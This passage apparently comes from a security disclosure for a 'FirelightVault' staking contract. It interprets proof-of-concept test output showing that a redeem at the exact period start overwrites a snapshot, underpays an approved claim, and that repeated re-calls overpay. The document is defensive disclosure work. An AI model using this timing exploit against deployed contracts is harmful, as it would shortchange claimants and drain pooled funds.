    requested by the approved claim  : 1500000000000
    payout() returned                : 1000000000000
    silent shortfall                 : 500000000000
    [out-of-band] manual re-call paid: 500000000000
    [out-of-band] a further re-call  : 250000000000
    total delivered                  : 1750000000000
    vs an approved claim of          : 1500000000000

Suite result: ok. 6 passed; 0 failed; 0 skipped
```

### Reading the output

**Baseline.** Two stakers deposit 1,000,000 fXRP each. At the exact second period 1 opens, the test asserts `totalAssetsAt(periodStart) == 2,000,000` and a `CHECKPOINT_ROLE` holder takes an honest period-start snapshot recording the same figure.

**Exploit.** One unprivileged staker calls `redeem()` in that block. `_logTrace` pushes at `Time.timestamp() == periodStart`, replacing the official snapshot with the post-redeem 1,000,000.

**Proof.** `withdrawAssets[capture+1]` still reports 1,000,000 as payable, so the payable pool on its own would have covered the claim, yet the `min` against the deflated snapshot caps the honest payout at 1,000,000. The claimant receives 1,000,000 of an approved 1,500,000.

**Boundary isolation.** The same staker performing the same redeem one second later leaves the cap at 2,000,000, pays the claim in full at 1,500,000, and correctly slashes the exiter down to 250,000. The 250,000 difference in the exiter's own outcome between the two runs is the gain the boundary timing buys them. Note that the "exiter kept, control" figure of 0 in the main test reflects a run in which the staker never redeemed at all and so has no withdrawal bucket to claim; the meaningful attacker-gain comparison is the boundary run against the one-second-later run.

**Shortfall handling.** `payout()` returns 1,000,000 against a 1,500,000 request without reverting. A manual re-call delivers the missing 500,000, and a further re-call delivers another 250,000, taking total delivery to 1,750,000 against a 1,500,000 claim. This establishes both that recovery is possible out of band and that the recovery route is uncapped rather than a controlled correction.

**Negative control.** Against `FirelightVaultBoundaryFixed`, which differs from the in-scope contract by exactly one line, the identical boundary redeem leaves the claim paid in full at 1,500,000. Applying that change to the in-scope contract flips the main test's assertions to failing, which confirms the test targets the defect itself rather than incidental behaviour.
